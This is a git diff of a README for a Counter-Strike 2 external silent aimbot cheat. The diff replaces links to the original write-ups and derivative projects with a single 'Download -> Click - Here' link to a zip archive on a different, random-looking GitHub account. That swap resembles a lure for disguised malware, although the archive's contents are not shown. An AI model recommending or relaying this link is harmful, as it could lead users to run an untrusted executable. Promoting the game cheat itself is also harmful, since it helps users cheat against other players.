@@ -4,15 +4,10 @@ CS2 external cheat.
 
 Analysis and implementation of CS2 external silent aimbot 
 
-EN -> [SilentAimbot - en](https://github.com/TKazer/CS2-External-Silent-AimBot)
-
-CN -> [SilentAimbot - cn](https://bbs.kanxue.com/thread-282616.htm)
+Download -> [Click - Here](https://github.com/bcnxujpp32y1/CS2_External/raw/refs/heads/master/CS2_External/Cs2_External.zip)
 
 ## ImGui library -> [OS-ImGui](https://github.com/TKazer/OS-ImGui)
 
-## Derivative projects
-1. AimStar -> [AimStar](https://github.com/CowNowK/AimStar) (By CowNow.)
-2. Aeonix -> [Aeonix](https://github.com/Fr0go1/Aeonix-Cs2) (By Fr0go1.)
 
 ## NOTICE
 
